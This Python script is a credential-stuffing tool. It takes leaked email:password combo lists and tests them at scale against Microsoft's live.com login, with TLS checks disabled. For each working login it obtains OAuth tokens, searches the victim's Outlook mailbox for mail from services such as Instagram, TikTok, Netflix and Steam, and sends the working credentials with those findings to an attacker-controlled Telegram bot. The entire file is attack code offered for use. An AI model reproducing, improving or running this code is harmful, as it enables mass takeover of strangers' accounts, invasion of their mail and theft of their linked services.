‏import requests,json,random,threading,time,os,sys,re,urllib.parse,telebot
‏from concurrent.futures import ThreadPoolExecutor,as_completed
‏from datetime import datetime
‏from colorama import init,Fore,Style
‏import urllib3
‏urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
‏init(autoreset=True)
‏Z='\033[1;31m'
‏X='\033[1;33m'
‏Z1='\033[2;31m'
‏F='\033[2;32m'
‏A='\033[2;34m'
‏C='\033[2;35m'
‏S='\033[2;36m'
‏G='\033[1;34m'
‏HH='\033[1;34m'
‏M='\x1b[1;37m'
‏W1='\x1b[1;97m'
‏Z = '\033[1;31m'
‏X = '\033[1;33m'
‏Z1 = '\033[2;31m'
‏F = '\033[2;32m'
‏A = '\033[2;34m'
‏C = '\033[2;35m'
‏B = '\033[2;36m'
‏Y = '\033[1;34m'
‏W = "\033[1;37m"
‏P1 = '\x1b[38;5;150m'
‏P2 = '\x1b[38;5;190m'
‏P  = '\x1b[1;97m'
‏J22 = '\x1b[38;5;209m'
‏C1  = '\x1b[38;5;120m'
‏E = '\033[1;31m'
‏W2 = '\x1b[38;5;120m'
‏W3 = '\x1b[38;5;204m'
‏W4 = '\x1b[38;5;150m'
‏W5 = '\x1b[1;33m'
‏W6 = '\x1b[1;31m'
‏W7 = "\033[1;33m"
‏W8 = '\x1b[38;5;117m'
‏W9 = "\033[1m\033[34m"
‏B = '\x1b[1;94m'
‏O = '\x1b[1;96m'
‏X = '\x1b[1;33m'
‏G = '\033[2;32m'
‏E = '\033[1;31m'
‏W2 = '\x1b[38;5;120m'
‏W3 = '\x1b[38;5;204m'
‏W4 = '\x1b[38;5;150m'
‏W5 = '\x1b[1;33m'
‏W6 = '\x1b[1;31m'
‏W7 = "\033[1;33m"
‏W8 = '\x1b[38;5;117m'
‏W9 = "\033[1m\033[34m"
‏P = '\x1b[1;97m'
‏B = '\x1b[1;94m'
‏O = '\x1b[1;96m'
‏Z = '\x1b[1;30m'
‏X = '\x1b[1;33m'
‏F = '\x1b[2;32m'
‏L = '\x1b[1;95m'
‏C = '\x1b[2;35m'
‏A = '\x1b[2;39m'
‏J = '\x1b[38;5;208m'
‏J1 = '\x1b[38;5;202m'
‏J2 = '\x1b[38;5;203m'
‏J21 = '\x1b[38;5;204m'
‏J22 = '\x1b[38;5;209m'
‏F1 = '\x1b[38;5;76m'
‏C1 = '\x1b[38;5;120m'
‏P1 = '\x1b[38;5;150m'
‏P2 = '\x1b[38;5;190m'
‏T = '\x1b[38;5;231m'
‏R = '\033[1;31m'    # أحمر
‏G = '\033[1;32m'    # أخضر
‏B = '\033[1;34m'    # أزرق
‏W = '\033[1;37m'

‏TB = telebot.TeleBot(input('توكن : ').strip())
‏CI = input('ايدي : ').strip()

‏SV={"noreply@id.supercell.com":"Supercell","security@mail.instagram.com":"Instagram","security@facebookmail.com":"Facebook","register@account.tiktok.com":"TikTok","info@x.com":"X (Twitter)","info@account.netflix.com":"Netflix","noreply@crunchyroll.com":"Crunchyroll","noreply@steampowered.com":"Steam","xboxreps@engage.xbox.com":"Xbox","help@acct.epicgames.com":"Epic Games","noreply@accts.krafton.com":"PUBG Mobile","yallaludo_account@support.yalla.live":"YALLA LUDO","service@mail.yallapay.live":"YALLA PAY"}

‏class HotmailSupercellChecker:
‏ def __init__(self):
‏  self.hits=0
‏  self.bad=0
‏  self.custom=0
‏  self.twofactor=0
‏  self.retries=0
‏  self.total=0
‏  self.lock=threading.Lock()
‏  self.session=requests.Session()
‏  self.session.verify=False
‏ def load_combo(self,combo_file):
‏  if not os.path.exists(combo_file):
‏   print(f"{Z}[Combo file not{M}")
‏   return[]
‏  combos=[]
‏  with open(combo_file,'r',encoding='utf-8',errors='ignore')as f:
‏   for line in f:
‏    line=line.strip()
‏    if':'in line:
‏     combos.append(line)
‏  return combos
‏ def send_telegram(self,username,password,links):
‏  try:
‏   lk=""
‏   for sv in links:
‏    lk+=f"• {sv}\n"
   ms=f"🔥 𝗛𝗜𝗧 𝗛𝗢𝗧𝗠𝗔𝗜𝗟\n\n📧 Email: {username}\n🔑 Password: {password}\n\n🔗 Services Found:\n{lk}\n\nBy: @WARIOR_PY"
   # ✅ إصلاح مشكلة إرسال الرسالة
‏   TB.send_message(CI, ms)
‏  except Exception as e:
‏   print(f"{Z}[Telegram Error] {e}{M}")
‏ def check_account(self,username,password):
‏  try:
‏   login_url="https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username={username}&contextid=2CCDB02DC526CA71&bk=1665024852&uaid=a5b22c26bc704002ac309462e8d061bb&pid=15216"
‏   payload={'ps':'2','psRNGCDefaultType':'','psRNGCEntropy':'','psRNGCSLK':'','canary':'','ctx':'','hpgrequestid':'','PPFT':'-Div0Bt28gmyaHIfgDZtd5xvxnb7eeDAQOIjXkqyoF1ekQB6gLEqbSdzNE05qpz*B1Q82VKHs*RNXPa8xZG1TJS5HGKjFMxGcQ51PMU77ulAR!JjAUTPM*Am5lkZU6Sa!wIdI6zYnUI8VYQHQOCJLb*lRsaiV5MhGQieznZ!EynMuuBHbBfLr28btqCBqLhzZXQ$$','PPSX':'Pa','NewUser':'1','FoundMSAs':'','fspost':'0','i21':'0','CookieDisclosure':'0','IsFidoSupported':'1','isSignupPost':'0','isRecoveryAttemptPost':'0','i13':'1','login':username,'loginfmt':username,'type':'11','LoginOptions':'1','lrt':'','lrtPartition':'','hisRegion':'','hisScaleUnit':'','passwd':password}
‏   headers={'Origin':'https://login.live.com','Content-Type':'application/x-www-form-urlencoded','User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Sec-Fetch-Site':'same-origin','Sec-Fetch-Mode':'navigate','Sec-Fetch-User':'?1','Sec-Fetch-Dest':'document','Referer':'https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&uaid=a5b22c26bc704002ac309462e8d061bb&display=touch&username={username}','Accept-Language':'en-US,en;q=0.9','Cookie':'MSPRequ=id=N&lt=1716447264&co=1; uaid=a5b22c26bc704002ac309462e8d061bb; MSPOK=$uuid-13a3c70b-5026-45a1-84df-99ba880a29e1; OParams=11O.Dor!ityyROuDARitpqlq4!6jDuS3TVfYeLnCZLW20ulsO01Qdr0qXZuVyFO!VZa*Ode4!5h*e1lPmdhKFK*6ILTEw4ijD1A8v7hGiQ8bGpPjhK3yWl0EV*mAvY4JhtfpSjuRnVhijB9BBans*iz34S6vrrGPp33lLT587mBFUxPivMbVSru!YTfb0UOm1orslTW9OU0Swk!a!SLJBnMnMD*fzrT*NgzjbkQkWYIBGvKY5*IM5n8iVuQAaElo9KJHfzxnnEdy4RBOhlUdJTexq3ggPsaje8GeZfSN0C78uHTH4J8zXgXFtGqjM5lu!mjcBIF0Y5HqLO4okxAlSs3c0BoY7OOGYeYRpnqhZvgRgmdHSgcH8sLtn1ln2Hr8iGoiAQ$$; MicrosoftApplicationsTelemetryDeviceId=60aecd7a-f1a5-4753-b014-1f35eaee233c; ai_session=MJm/eRczdMHWqhQym5bUBG|1716447265233|1716447265233; MSFPC=GUID=8edf406d4669417a93d813d0d4a37bc1&HASH=8edf&LV=202405&V=4&LU=1716447268126','Accept-Encoding':'gzip, deflate','Content-Length':'566'}
‏   try:
‏    response=requests.post(login_url,data=payload,headers=headers,timeout=30,verify=False,allow_redirects=False)
‏   except:
‏    with self.lock:
‏     self.retries+=1
‏    return"RETRY"
‏   response_text=response.text
‏   if"Your account or password is incorrect."in response_text or"That Microsoft account doesn't exist."in response_text or"Sign in to your Microsoft account"in response_text:
‏    with self.lock:
‏     self.bad+=1
‏    return"BAD"
‏   if",AC:null,urlFedConvertRename"in response_text:
‏    with self.lock:
‏     self.bad+=1
‏    return"BAN"
‏   if"account.live.com/recover?mkt"in response_text or"recover?mkt"in response_text or"account.live.com/identity/confirm?mkt"in response_text or"Email/Confirm?mkt"in response_text:
‏    with self.lock:
‏     self.twofactor+=1
‏    self.save_result(username,password,"2FA ENABLED","2FA")
‏    return"2FA"
‏   if"/cancel?mkt="in response_text or"/Abuse?mkt="in response_text:
‏    with self.lock:
‏     self.custom+=1
‏    return"CUSTOM"
‏   success_cookies='ANON'in str(response.cookies)or'WLSSC'in str(response.cookies)
‏   success_address='https://login.live.com/oauth20_desktop.srf?'in response.headers.get('Location','')
‏   if success_cookies or success_address:
‏    cookies=response.cookies
‏    location=response.headers.get('Location','')
‏    refresh_token=None
‏    if'refresh_token='in location:
‏     start=location.find('refresh_token=')+len('refresh_token=')
‏     end=location.find('&',start)
‏     if end==-1:
‏      end=len(location)
‏     refresh_token=location[start:end]
‏    if not refresh_token:
‏     try:
‏      if'#'in location:
‏       fragment=location.split('#')[1]
‏       params=dict(x.split('=')for x in fragment.split('&')if'='in x)
‏       refresh_token=params.get('refresh_token')
‏     except:
‏      pass
‏    if not refresh_token:
‏     with self.lock:
‏      self.bad+=1
‏     return"BAD"
‏    token_url="https://login.live.com/oauth20_token.srf"
‏    token_payload={'grant_type':'refresh_token','client_id':'0000000048170EF2','scope':'https://substrate.office.com/User-Internal.ReadWrite','redirect_uri':'https://login.live.com/oauth20_desktop.srf','refresh_token':refresh_token,'uaid':'db28da170f2a4b85a26388d0a6cdbb6e'}
‏    token_headers={'x-ms-sso-Ignore-SSO':'1','User-Agent':'Outlook-Android/2.0','Content-Type':'application/x-www-form-urlencoded','Content-Length':'547','Host':'login.live.com','Connection':'Keep-Alive','Accept-Encoding':'gzip'}
‏    try:
‏     token_response=requests.post(token_url,data=token_payload,headers=token_headers,timeout=30,verify=False)
‏    except:
‏     with self.lock:
‏      self.retries+=1
‏     return"RETRY"
‏    if token_response.status_code!=200:
‏     with self.lock:
‏      self.bad+=1
‏     return"BAD"
‏    try:
‏     token_data=token_response.json()
‏     access_token=token_data.get('access_token')
‏     if not access_token:
‏      with self.lock:
‏       self.bad+=1
‏      return"BAD"
‏     outlook_headers={'User-Agent':'Outlook-Android/2.0','Pragma':'no-cache','Accept':'application/json','ForceSync':'false','Authorization':f'Bearer {access_token}','X-AnchorMailbox':f'CID:{refresh_token}','Host':'substrate.office.com','Connection':'Keep-Alive','Accept-Encoding':'gzip'}
‏     found_links=[]
‏     for email,service in SV.items():
‏      search_url="https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"
‏      search_payload={"Cvid":"7ef2720e-6e59-ee2b-a217-3a4f427ab0f7","Scenario":{"Name":"owa.react"},"TimeZone":"Egypt Standard Time","TextDecorations":"Off","EntityRequests":[{"EntityType":"Conversation","ContentSources":["Exchange"],"Filter":{"Or":[{"Term":{"DistinguishedFolderName":"msgfolderroot"}},{"Term":{"DistinguishedFolderName":"DeletedItems"}}]},"From":0,"Query":{"QueryString":email},"RefiningQueries":None,"Size":25,"Sort":[{"Field":"Score","SortDirection":"Desc","Count":3},{"Field":"Time","SortDirection":"Desc"}],"EnableTopResults":True,"TopResultsCount":3}],"AnswerEntityRequests":[{"Query":{"QueryString":email},"EntityTypes":["Event","File"],"From":0,"Size":10,"EnableAsyncResolution":True}],"QueryAlterationOptions":{"EnableSuggestion":True,"EnableAlteration":True,"SupportedRecourseDisplayTypes":["Suggestion","NoResultModification","NoResultFolderRefinerModification","NoRequeryModification","Modification"]},"LogicalId":"446c567a-02d9-b739-b9ca-616e0d45905c"}
‏      try:
‏       search_response=requests.post(search_url,json=search_payload,headers=outlook_headers,timeout=30,verify=False)
‏       if search_response.status_code==200:
‏        search_data=search_response.json()
‏        total_msgs=0
‏        if'EntityRequests'in search_data and len(search_data['EntityRequests'])>0:
‏         entity_data=search_data['EntityRequests'][0]
‏         if'Total'in entity_data:
‏          total_msgs=int(entity_data['Total'])
‏        search_text=json.dumps(search_data)
‏        if'"Total":'in search_text:
‏         try:
‏          start=search_text.find('"Total":')+len('"Total":')
‏          end=search_text.find(',',start)
‏          total_str=search_text[start:end].strip()
‏          total_msgs=int(total_str)
‏         except:
‏          pass
‏        if total_msgs>0:
‏         found_links.append(service)
‏      except:
‏       continue
‏     if found_links:
‏      with self.lock:
‏       self.hits+=1
‏      self.save_result(username,password,"HIT",None,"HIT")
      # ✅ استدعاء دالة إرسال التلغرام للصيد
‏      self.send_telegram(username,password,found_links)
‏      return"HIT"
‏     else:
‏      with self.lock:
‏       self.custom+=1
‏      self.save_result(username,password,"NOT LINKED",None,"FREE")
‏      return"CUSTOM"
‏    except:
‏     with self.lock:
‏      self.bad+=1
‏     return"BAD"
‏   else:
‏    with self.lock:
‏     self.bad+=1
‏    return"BAD"
‏  except:
‏   with self.lock:
‏    self.retries+=1
‏   return"RETRY"
‏ def save_result(self,username,password,info,proxy=None,hit_type="FREE"):
‏  if hit_type=="HIT":
‏   with open("hits.txt","a",encoding="utf-8")as f:
‏    f.write(f"{username}:{password}\n")
‏ def print_stats(self,running=True):
‏  if running:
‏   sys.stdout.write(f"\r     {S}{M}Hits:{F}{self.hits:,}{M} | 2FA:{C}{self.twofactor:,}{M} | Custom:{X}{self.custom:,}{M} | Bad:{Z}{self.bad:,}{M} | Retries:{A}{self.retries:,}{S}{M}\n")
‏   sys.stdout.flush()
‏  else:
‏   exit()
‏ def run_checker(self,combo_file):
‏  combos=self.load_combo(combo_file)
‏  if not combos:
‏   print(f"{Z}No combos{M}")
‏   return
‏  self.total=len(combos)
‏  start_time=time.time()
‏  batch_size=500
‏  completed=0
‏  for i in range(0,len(combos),batch_size):
‏   batch=combos[i:i+batch_size]
‏   with ThreadPoolExecutor(max_workers=min(50,len(batch)))as executor:
‏    futures=[]
‏    for combo in batch:
‏     try:
‏      username,password=combo.split(':',1)
‏      futures.append(executor.submit(self.check_account,username.strip(),password.strip()))
‏     except:
‏      continue
‏    for future in as_completed(futures):
‏     result=future.result()
‏     completed+=1
‏     if completed%10==0 or time.time()-start_time>5:
‏      self.print_stats()
‏      start_time=time.time()
‏  self.print_stats(running=False)
from pathlib import Path

def main():
    checker = HotmailSupercellChecker()

    base_dir = Path(".")
    combo_files = sorted(
        f for f in base_dir.iterdir()
        if f.is_file() and f.name.startswith("hot") and f.suffix == ".txt"
    )

    if not combo_files:
        print(f"{Z}No hot*.txt files found{M}")
        return

    os.system("clear")
    try:
        for combo_file in combo_files:
            print(f"{X}Processing: {combo_file.name}{M}")
            checker.run_checker(str(combo_file))
    except KeyboardInterrupt:
        pass
    except Exception:
        pass

if __name__ == "__main__":
    main()
